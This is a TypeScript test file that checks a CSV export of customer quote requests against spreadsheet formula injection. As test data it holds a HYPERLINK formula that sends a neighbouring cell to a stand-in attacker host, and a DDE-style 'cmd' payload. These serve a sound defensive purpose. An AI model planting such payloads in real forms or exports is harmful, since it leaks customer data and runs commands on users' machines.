import { test } from "node:test";
import assert from "node:assert/strict";
import { rfqsToCsv } from "../src/lib/csv";
import type { StoredRfq } from "../src/lib/rfqStore";

/**
 * The ops export exists to be opened in Excel — the runbook points the desk at
 * it for quoting, follow-up and QuickBooks entry. Every text column in it is
 * typed by whoever filled in the public request form, so it is attacker-
 * controlled input landing in a spreadsheet.
 */

function rfq(contact: Partial<StoredRfq["contact"]>, message = ""): StoredRfq {
  return {
    ref: "JME-0001",
    createdAt: "2026-08-18T00:00:00Z",
    updatedAt: "2026-08-18T00:00:00Z",
    status: "new",
    freight: false,
    contact: {
      company: "Acme", name: "Riley", lastName: "", email: "buyer@acme.test",
      phone: "", phoneExt: "", serial: "", shipAddress: "",
      billingSameAsShipping: true, wantsAccount: true,
      ...contact,
    },
    items: [{ sku: "P12109", qty: 2 }],
    message,
  } as unknown as StoredRfq;
}

/** Fields as a spreadsheet sees them: unwrapped, with doubled quotes undone. */
function cells(csv: string, line = 1): string[] {
  const row = csv.split("\r\n")[line]!;
  const out: string[] = [];
  let cur = "";
  let quoted = false;
  for (let i = 0; i < row.length; i++) {
    const c = row[i]!;
    if (quoted) {
      if (c === '"' && row[i + 1] === '"') { cur += '"'; i++; }
      else if (c === '"') quoted = false;
      else cur += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { out.push(cur); cur = ""; }
    else cur += c;
  }
  out.push(cur);
  return out;
}

const FORMULA_START = /^[=+\-@\t\r]/;

test("a customer cannot put a live formula in the desk's spreadsheet", () => {
  // The realistic attack: a link that exfiltrates the neighbouring cell — the
  // customer contact details sitting next to it — when someone clicks it.
  const attack = '=HYPERLINK("http://attacker.example/?d="&A1,"Open invoice")';
  const csv = rfqsToCsv([rfq({ company: attack })]);
  for (const cell of cells(csv)) {
    assert.doesNotMatch(cell, FORMULA_START, `field "${cell.slice(0, 40)}" would be run as a formula`);
  }
});

test("every leading character a spreadsheet treats as a formula is neutralised", () => {
  for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
    const csv = rfqsToCsv([rfq({ company: lead + "cmd|'/c calc'!A0" })]);
    const company = cells(csv)[5]!;
    assert.doesNotMatch(company, FORMULA_START, `leading ${JSON.stringify(lead)} still starts the field`);
    assert.ok(company.startsWith("'"), "expected the apostrophe text marker");
  }
});

test("the message field is covered too, not just the name columns", () => {
  const csv = rfqsToCsv([rfq({}, "=1+1")]);
  assert.doesNotMatch(cells(csv).at(-1)!, FORMULA_START);
});

test("ordinary values are passed through untouched", () => {
  const csv = rfqsToCsv([rfq({ company: "Acme Converting", phone: "1-269-555-0142" })]);
  const c = cells(csv);
  assert.equal(c[5], "Acme Converting");
  assert.equal(c[9], "1-269-555-0142");
  assert.equal(c[8], "buyer@acme.test");
});

test("RFC 4180 quoting still holds for commas, quotes and newlines", () => {
  const csv = rfqsToCsv([rfq({ company: 'Acme, "The" Co.' }, "line one\nline two")]);
  const c = cells(csv);
  assert.equal(c[5], 'Acme, "The" Co.');
  assert.equal(c.at(-1), "line one\nline two");
});

test("the header row is not disturbed", () => {
  const header = rfqsToCsv([]).split("\r\n")[0]!;
  assert.equal(header.split(",")[0], "ref");
  assert.doesNotMatch(header, /'/);
});
